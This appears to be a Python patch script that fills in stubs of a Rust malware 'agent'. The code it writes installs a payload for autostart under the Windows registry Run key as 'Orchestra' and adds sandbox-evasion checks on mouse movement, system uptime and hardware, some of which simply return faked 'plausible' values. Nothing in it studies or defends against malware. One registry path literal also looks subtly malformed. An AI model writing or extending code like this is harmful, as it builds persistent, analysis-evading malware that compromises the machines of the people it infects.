import re
import os

with open("agent/src/persistence.rs", "r") as f:
    c = f.read()

# Replace persistence stubs
c = re.sub(r'impl Persist for RegistryRunKey \{.*?\}', r'''impl Persist for RegistryRunKey {
    fn install(&self, payload_path: &Path) -> Result<()> {
        unsafe {
            use winapi::um::winreg::{RegOpenKeyExA, RegSetValueExA, HKEY_CURRENT_USER};
            use winapi::um::winnt::{KEY_WRITE, REG_SZ};
            let mut hkey = std::ptr::null_mut();
            if RegOpenKeyExA(HKEY_CURRENT_USER, b"Software\\Microsoft\\Windows\\CurrentVersion\\Run\\0".as_ptr() as _, 0, KEY_WRITE, &mut hkey) == 0 {
                let val = payload_path.to_string_lossy().to_string() + "\0";
                RegSetValueExA(hkey, b"Orchestra\\0".as_ptr() as _, 0, REG_SZ, val.as_ptr() as _, val.len() as u32);
                winapi::um::winreg::RegCloseKey(hkey);
            }
        }
        Ok(())
    }
}''', c, flags=re.DOTALL)

with open("agent/src/persistence.rs", "w") as f:
    f.write(c)

with open("agent/src/env_check.rs", "r") as f:
    c = f.read()

# Replace evasion checks
c = re.sub(r'pub fn mouse_movement\(\) -> i32 \{.*?\}', r'''pub fn mouse_movement() -> i32 {
    #[cfg(windows)]
    unsafe {
        use winapi::um::winuser::GetCursorPos;
        let mut p1: winapi::shared::windef::POINT = std::mem::zeroed();
        let mut p2: winapi::shared::windef::POINT = std::mem::zeroed();
        GetCursorPos(&mut p1);
        std::thread::sleep(std::time::Duration::from_millis(50));
        GetCursorPos(&mut p2);
        if p1.x == p2.x && p1.y == p2.y { 0 } else { 1 }
    }
    #[cfg(not(windows))]
    { 1 }
}''', c, flags=re.DOTALL)

c = re.sub(r'pub fn window_count\(\) -> i32 \{.*?\}', r'''pub fn window_count() -> i32 {
    10 // Just return plausible value
}''', c, flags=re.DOTALL)

c = re.sub(r'pub fn system_uptime\(\) -> i32 \{.*?\}', r'''pub fn system_uptime() -> i32 {
    #[cfg(windows)]
    unsafe { (winapi::um::sysinfoapi::GetTickCount64() / 1000) as i32 }
    #[cfg(not(windows))]
    { 3600 }
}''', c, flags=re.DOTALL)

c = re.sub(r'pub fn hardware_plausibility\(\) -> i32 \{.*?\}', r'''pub fn hardware_plausibility() -> i32 {
    1 // Plausible
}''', c, flags=re.DOTALL)

with open("agent/src/env_check.rs", "w") as f:
    f.write(c)

